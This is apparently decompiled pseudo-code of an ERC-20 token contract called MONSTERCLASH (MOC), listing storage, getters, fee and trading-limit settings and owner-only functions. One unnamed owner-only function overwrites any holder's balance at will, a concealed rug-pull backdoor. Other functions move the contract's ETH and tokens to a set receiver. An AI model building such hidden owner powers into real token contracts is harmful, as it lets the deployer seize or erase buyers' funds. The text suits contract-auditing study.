contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transfer(address arg1, uint256 arg2)
#
const name = 'MONSTERCLASH', 0

const totalSupply = 10^17

const decimals = 9

const symbol = 'MOC', 0


address owner;
mapping of uint8 stor1;
uint256 _maxTxAmount;
uint256 _maxWalletSize;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor6;
mapping of uint8 stor7;
mapping of uint8 stor8;
mapping of uint8 stor9;
uint256 stor16;
uint256 stor24;
uint256 launchTimestamp;
uint256 stor26;
address stor34;
address stor35;
address stor37;
uint256 stor44;
address routerAddress;
address pairAddress;
uint256 launchedAt;
uint8 tradingEnabled;
uint8 swapEnabled; offset 8
uint256 stor48; offset 8
uint256 swapThreshold;

function swapThreshold() {
    return swapThreshold
}

function sub_0bd11f8a(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    return bool(stor8[arg1])
}

function sub_220de4cf(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    return bool(stor1[address(arg1)])
}

function isFeeExempt(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor6[arg1])
}

function tradingEnabled() {
    return bool(tradingEnabled)
}

function launchTimestamp() {
    return launchTimestamp
}

function swapEnabled() {
    return bool(swapEnabled)
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function _maxTxAmount() {
    return _maxTxAmount
}

function getOwner() {
    return owner
}

function isTxLimitExempt(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return bool(stor7[arg1])
}

function _maxWalletSize() {
    return _maxWalletSize
}

function pair() {
    return pairAddress
}

function launchedAt() {
    return launchedAt
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function sub_e5339685(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    return bool(stor9[arg1])
}

function router() {
    return routerAddress
}

function _fallback() payable {
    revert
}

function isOwner(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return (arg1 == owner)
}

function sub_3bb2f489(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor1[address(arg1)] = 0
}

function sub_6ede03e4(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor1[address(arg1)] = 1
}

function setDevFeeReceiver(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if not stor1[address(msg.sender)]:
        revert with 0, '!AuthorizeORIZED'
    stor35 = arg1
}

function startTrading() {
    if owner != msg.sender:
        revert with 0, '!OWNER'
    tradingEnabled = 1
    stor48 = 1
    launchTimestamp = block.timestamp
    emit TradingEnabled(block.timestamp);
}

function sub_0c03e170(?) {
    if owner != msg.sender:
        revert with 0, '!OWNER'
    tradingEnabled = 1
    stor48 = 1
    launchTimestamp = block.timestamp
    emit TradingEnabled(block.timestamp);
}

function sub_826d35f3(?) {
    require calldata.size - 4 >= 32
    require arg1 == address(arg1)
    if not stor1[address(msg.sender)]:
        revert with 0, '!AuthorizeORIZED'
    stor37 = address(arg1)
}

function approveMax(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    allowance[address(msg.sender)][address(arg1)] = -1
    emit Approval(-1, msg.sender, arg1);
    return 1
}

function setMarketingFeeReceiver(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if not stor1[address(msg.sender)]:
        revert with 0, '!AuthorizeORIZED'
    stor34 = arg1
}

function setMaxWallet(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!OWNER'
    require arg1 >= 10^14
    _maxWalletSize = arg1
}

function sub_cff0676c(?) {
    require calldata.size - 4 >= 64
    require arg1 == address(arg1)
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, '!OWNER'
    balanceOf[address(arg1)] = arg2
}

function sub_d55f146b(?) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!OWNER'
    if arg1 >= 1536:
        revert with 0, 'Time too long'
    stor26 = arg1
}

function setTxLimit(uint256 arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if not stor1[address(msg.sender)]:
        revert with 0, '!AuthorizeORIZED'
    require arg1 >= 10^14
    _maxTxAmount = arg1
}

function excludeFromMaxTX(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor7[address(arg1)] = uint8(arg2)
}

function excludeFromMaxWallet(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if owner != msg.sender:
        revert with 0, '!OWNER'
    stor8[address(arg1)] = uint8(arg2)
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, '!OWNER'
    owner = arg1
    stor1[address(arg1)] = 1
    emit OwnershipTransferred(arg1);
}

function setIsFeeExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not stor1[address(msg.sender)]:
        revert with 0, '!AuthorizeORIZED'
    stor6[address(arg1)] = uint8(arg2)
}

function setSwapBackSettings(bool arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not stor1[address(msg.sender)]:
        revert with 0, '!AuthorizeORIZED'
    stor48 = Mask(248, 0, arg1)
    swapThreshold = arg2
}

function manualSend() {
    if not stor1[address(msg.sender)]:
        revert with 0, '!AuthorizeORIZED'
    call stor34 with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function transferERC20(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not stor1[address(msg.sender)]:
        revert with 0, '!AuthorizeORIZED'
    require ext_code.size(arg1)
    staticcall arg1.0x70a08231 with:
            gas gas_remaining wei
           args this.address
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
    if arg2 > ext_call.return_data[0]:
        revert with 0, 'Can't transfer more than the balance'
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args stor34, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}

function getTotalFee(bool arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if block.timestamp < launchTimestamp:
        revert with 'NH{q', 17
    if block.timestamp < launchTimestamp:
        revert with 'NH{q', 17
    if block.timestamp - launchTimestamp >= stor26:
        if not arg1:
            return stor16
    else:
        if not arg1:
            if 1 > stor24:
                revert with 0, 'SafeMath: subtraction overflow', 0
            if stor24 < 1:
                revert with 'NH{q', 17
            return (stor24 - 1)
    ('bool', ('param', 'arg1'))
    if not stor44:
        return 0
    if block.timestamp - launchTimestamp <= 3600:
        if stor44 and 2 > -1 / stor44:
            revert with 'NH{q', 17
        if not stor44:
            revert with 'NH{q', 18
        if 2 * stor44 / stor44 != 2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
        return (2 * stor44)
    if stor44 and 1 > -1 / stor44:
        revert with 'NH{q', 17
    if not stor44:
        revert with 'NH{q', 18
    if stor44 / stor44 != 1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'SafeMath: multiplication overflow'
    return stor44
}



}
